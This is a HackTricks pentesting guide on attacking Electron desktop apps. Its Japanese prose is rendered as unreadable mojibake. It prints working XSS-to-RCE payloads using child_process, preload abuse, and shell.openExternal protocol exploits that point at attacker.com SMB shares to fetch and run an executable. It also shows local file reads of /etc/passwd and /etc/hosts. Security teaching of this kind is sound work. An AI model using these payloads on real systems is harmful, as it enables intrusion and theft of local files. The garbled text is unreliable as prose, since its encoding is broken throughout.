# Electronãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒª

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ã¯ã˜ã‚ã«

Electronã¯**Chromiumã«åŸºã¥ã„ã¦**ã„ã¾ã™ãŒã€ãƒ–ãƒ©ã‚¦ã‚¶ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒ¢ãƒ€ãƒ³ãªãƒ–ãƒ©ã‚¦ã‚¶ã§å®Ÿè£…ã•ã‚Œã¦ã„ã‚‹ç‰¹å®šã®åŸå‰‡ã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¯å­˜åœ¨ã—ã¾ã›ã‚“ã€‚\
Electronã¯ã€**NodeJS**ãŒ**ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰**ã§ã‚ã‚Šã€**Chromium**ãŒ**ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰**ã§ã‚ã‚‹ã€ãƒ­ãƒ¼ã‚«ãƒ«ã®ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰+ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã‚¢ãƒ—ãƒªã®ã‚ˆã†ãªã‚‚ã®ã§ã™ã€‚

é€šå¸¸ã€electronã‚¢ãƒ—ãƒªã®ã‚³ãƒ¼ãƒ‰ã¯`.asar`ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ä¸­ã«ã‚ã‚Šã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€ãã‚Œã‚’æŠ½å‡ºã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Electronã‚¢ãƒ—ãƒªã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰å†…ã®`packet.json`ã«ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šãŒè¨˜è¿°ã•ã‚ŒãŸ`main.js`ãƒ•ã‚¡ã‚¤ãƒ«ãŒæŒ‡å®šã•ã‚Œã¦ã„ã¾ã™ã€‚
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electronã«ã¯2ã¤ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚¿ã‚¤ãƒ—ãŒã‚ã‚Šã¾ã™ï¼š

* ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆNodeJSã¸ã®å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ï¼‰
* ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ç†ç”±ã‹ã‚‰NodeJSã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒåˆ¶é™ã•ã‚Œã¦ã„ã‚‹ã¹ãï¼‰

![](<../../../.gitbook/assets/image (307) (5) (1).png>)

**ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹**ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ãƒ–ãƒ©ã‚¦ã‚¶ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã§ã™ã€‚
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
**ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹**ã®è¨­å®šã¯ã€main.jsãƒ•ã‚¡ã‚¤ãƒ«å†…ã®**ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹**ã§**è¨­å®š**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è¨­å®šãŒæ­£ã—ãè¡Œã‚ã‚Œã¦ã„ã‚‹å ´åˆã€ã„ãã¤ã‹ã®è¨­å®šã¯Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒRCEã‚„ãã®ä»–ã®è„†å¼±æ€§ã‚’å—ã‘ã‚‹ã“ã¨ã‚’é˜²ãã¾ã™ã€‚

ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€Node APIã‚’ä»‹ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‡ãƒã‚¤ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®2ã¤ã®è¨­å®šã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®JavaScriptãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‡ãƒã‚¤ã‚¹ã‚„ã‚·ã‚¹ãƒ†ãƒ ãƒ¬ãƒ™ãƒ«ã®ã‚³ãƒãƒ³ãƒ‰ã«ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã®ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’æä¾›ã—ã¾ã™ã€‚

* **`nodeIntegration`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`off`ã§ã™ã€‚`on`ã«ã™ã‚‹ã¨ã€ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰Nodeã®æ©Ÿèƒ½ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
* **`contextIsolation`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`on`ã§ã™ã€‚`on`ã«ã™ã‚‹ã¨ã€ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã¨ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ã¯åˆ†é›¢ã•ã‚Œã¾ã›ã‚“ã€‚
* **`preload`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ç©ºã§ã™ã€‚
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã‚ªãƒ•ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€NodeJSãŒå®Ÿè¡Œã§ãã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒåˆ¶é™ã•ã‚Œã¾ã™ã€‚
* Workersã§ã®Node Integration
* **`nodeIntegrationInSubframes`** - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`off`ã§ã™ã€‚
* **`nodeIntegration`**ãŒ**æœ‰åŠ¹**ã«ãªã£ã¦ã„ã‚‹å ´åˆã€Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®iframeã«èª­ã¿è¾¼ã¾ã‚Œã‚‹Webãƒšãƒ¼ã‚¸ã§Node.jsã®APIã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **`nodeIntegration`**ãŒ**ç„¡åŠ¹**ã«ãªã£ã¦ã„ã‚‹å ´åˆã€ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã¯iframeå†…ã§èª­ã¿è¾¼ã¾ã‚Œã¾ã™ã€‚

è¨­å®šã®ä¾‹ï¼š
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
ä»¥ä¸‹ã¯[ã“ã¡ã‚‰](https://7as.es/electron/nodeIntegration\_rce.txt)ã‹ã‚‰ã®**RCEãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã®ä¸€éƒ¨ã§ã™ï¼š
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚­ãƒ£ãƒ—ãƒãƒ£

start-mainã®è¨­å®šã‚’å¤‰æ›´ã—ã€ãƒ—ãƒ­ã‚­ã‚·ã®ä½¿ç”¨ã‚’è¿½åŠ ã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«è¨­å®šã—ã¦ãã ã•ã„ã€‚
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron ãƒ­ãƒ¼ã‚«ãƒ«ã‚³ãƒ¼ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

Electronã‚¢ãƒ—ãƒªã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã§å®Ÿè¡Œã§ãã‚‹å ´åˆã€ä»»æ„ã®JavaScriptã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä»¥ä¸‹ã®æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

ã‚‚ã— **nodeIntegration** ãŒ **on** ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®JavaScriptã¯ `require()` ã‚’å‘¼ã³å‡ºã™ã ã‘ã§ç°¡å˜ã«Node.jsã®æ©Ÿèƒ½ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€Windowsä¸Šã§calcã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

ã“ã®è¨­å®šã§ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€**ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼å†…ã®ä»–ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚ˆã‚Šã‚‚å…ˆã«ãƒ­ãƒ¼ãƒ‰**ã•ã‚Œã‚‹ãŸã‚ã€**Node APIã¸ã®ç„¡åˆ¶é™ãªã‚¢ã‚¯ã‚»ã‚¹**ãŒã‚ã‚Šã¾ã™ã€‚
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
ã—ãŸãŒã£ã¦ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ãƒãƒ¼ãƒ‰ã®æ©Ÿèƒ½ã‚’ãƒšãƒ¼ã‚¸ã«ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã§ãã¾ã™ï¼š

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**`contextIsolation`ãŒã‚ªãƒ³ã«ãªã£ã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ã¯ã€**ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¨JavaScript Electronã®å†…éƒ¨ã‚³ãƒ¼ãƒ‰ã®é–“ã«åˆ†é›¢ã•ã‚ŒãŸã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã‚’å°å…¥ã™ã‚‹ã“ã¨ã§ã€å„ã‚³ãƒ¼ãƒ‰ã®JavaScriptå®Ÿè¡ŒãŒäº’ã„ã«å½±éŸ¿ã‚’ä¸ãˆãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€RCEã®å¯èƒ½æ€§ã‚’æ’é™¤ã™ã‚‹ãŸã‚ã«å¿…è¦ãªæ©Ÿèƒ½ã§ã™ã€‚

ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆãŒåˆ†é›¢ã•ã‚Œã¦ã„ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯æ¬¡ã®ã“ã¨ãŒã§ãã¾ã™ï¼š

1. ãƒ¬ãƒ³ãƒ€ãƒ©ãƒ¼ã§**ä»»æ„ã®JavaScriptã‚’å®Ÿè¡Œ**ã™ã‚‹ï¼ˆXSSã¾ãŸã¯å¤–éƒ¨ã‚µã‚¤ãƒˆã¸ã®ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ï¼‰
2. preloadã‚³ãƒ¼ãƒ‰ã¾ãŸã¯Electronã®å†…éƒ¨ã‚³ãƒ¼ãƒ‰ã§ä½¿ç”¨ã•ã‚Œã‚‹**çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä¸Šæ›¸ã**ã™ã‚‹
3. **ä¸Šæ›¸ãã•ã‚ŒãŸé–¢æ•°ã®ä½¿ç”¨**ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹
4. RCEï¼Ÿ

çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ãŒä¸Šæ›¸ãã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹å ´æ‰€ã¯2ã¤ã‚ã‚Šã¾ã™ï¼špreloadã‚³ãƒ¼ãƒ‰ã¾ãŸã¯Electronã®å†…éƒ¨ã‚³ãƒ¼ãƒ‰ã§ã™ï¼š

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### ã‚¯ãƒªãƒƒã‚¯ã‚¤ãƒ™ãƒ³ãƒˆã®ãƒã‚¤ãƒ‘ã‚¹

ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹éš›ã«åˆ¶é™ãŒã‚ã‚‹å ´åˆã€é€šå¸¸ã®å·¦ã‚¯ãƒªãƒƒã‚¯ã§ã¯ãªã**ä¸­ã‚¯ãƒªãƒƒã‚¯**ã‚’è¡Œã†ã“ã¨ã§ãã‚Œã‚‰ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```javascript
window.addEventListener('click', (e) => {
```
## shell.openExternalã‚’ä»‹ã—ãŸRCE

Electronãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒé©åˆ‡ãª`nodeIntegration`ã€`contextIsolation`è¨­å®šã§å±•é–‹ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰preloadã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„Electronãƒã‚¤ãƒ†ã‚£ãƒ–ã‚³ãƒ¼ãƒ‰ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã§ã®RCEã‚’é”æˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ãŸã‚Šæ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’é–‹ããŸã³ã«ã€ä»¥ä¸‹ã®ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ï¼š

{% code overflow="wrap" %}
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
{% endcode %}

ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ã“ã‚Œã‚‰ã®ãƒªã‚¹ãƒŠãƒ¼ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã—ã¦ã€ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ç‹¬è‡ªã®ãƒ“ã‚¸ãƒã‚¹ãƒ­ã‚¸ãƒƒã‚¯ã‚’å®Ÿè£…ã—ã¾ã™ã€‚æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã®ä½œæˆæ™‚ã«ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã•ã‚ŒãŸãƒªãƒ³ã‚¯ã‚’ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¾ãŸã¯ã‚¿ãƒ–ã§é–‹ãã¹ãã‹ã€Webãƒ–ãƒ©ã‚¦ã‚¶ã§é–‹ãã¹ãã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã®ä¾‹ã§ã¯ã€`openInternally`é–¢æ•°ã§æ¤œè¨¼ãŒå®Ÿè£…ã•ã‚Œã¦ãŠã‚Šã€`false`ã‚’è¿”ã™å ´åˆã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯`shell.openExternal`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒªãƒ³ã‚¯ã‚’Webãƒ–ãƒ©ã‚¦ã‚¶ã§é–‹ãã‚‚ã®ã¨ã—ã¾ã™ã€‚

ä»¥ä¸‹ã¯ç°¡ç•¥åŒ–ã•ã‚ŒãŸç–‘ä¼¼ã‚³ãƒ¼ãƒ‰ã§ã™ï¼š

![](<../../../.gitbook/assets/image (638) (2) (1) (1).png>)

![](<../../../.gitbook/assets/image (620).png>)

Electron JSã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã«ã‚ˆã‚Œã°ã€`openExternal`é–¢æ•°ã¯**ä¿¡é ¼ã§ããªã„ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å—ã‘å…¥ã‚Œã¦ã¯ãªã‚‰ãªã„**ã€ãªãœãªã‚‰ãã‚Œã«ã‚ˆã£ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒhttps://ã‚„http://ãªã©ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä»‹ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ã‚’åˆ¶é™ã—ãªã„å ´åˆã€ç•°ãªã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’æ‚ªç”¨ã—ãŸRCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰ãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚

ç•°ãªã‚‹OSã¯ã€RCEã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ã®ã‚ã‚‹ã•ã¾ã–ã¾ãªãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[https://positive.security/blog/url-open-rce](https://positive.security/blog/url-open-rce#windows-10-19042)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚ä»¥ä¸‹ã«Windowsã®ä¾‹ã‚’ç¤ºã—ã¾ã™ï¼š
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>


<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%[5Cattacker.com](<http://5cattacker.com/>)%5Csmb_share%5Ctools&displayname=Important%20update")
</script>


<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
ã“ã‚Œã‚‰ã®ä¾‹ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€[https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)ã¨[https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

## å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Šï¼šXSS + contextIsolation

`contextIsolation`ãŒfalseã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚Šã€ãã‚Œã‚‰ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™ãŸã‚ã«\<webview>ï¼ˆ\<iframe>ã«ä¼¼ã¦ã„ã¾ã™ãŒã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ï¼‰ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€**\<webview src=â€file:///etc/passwdâ€>\</webview>**ã®ã‚ˆã†ãªã‚‚ã®ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

![](../../../.gitbook/assets/1-u1jdryuwaevwjmf\_f2ttjg.png)

ã¾ãŸã€ã“ã®[**writeup**](https://bugcrowd.com/disclosures/f7ce8504-0152-483b-bbf3-fb9b759f9f89/critical-local-file-read-in-electron-desktop-app)ã‹ã‚‰ã‚‚ã€**å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹**åˆ¥ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + å¤ã„Chromium**

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**Chromium**ãŒ**å¤ã„**å ´åˆã€ãã‚Œã«ã¯**æ—¢çŸ¥ã®è„†å¼±æ€§**ãŒå­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ãã‚Œã‚’**åˆ©ç”¨ã—ã¦XSSã‚’ä»‹ã—ã¦RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã‚‹**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã“ã®**è§£èª¬**ã§ä¾‹ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

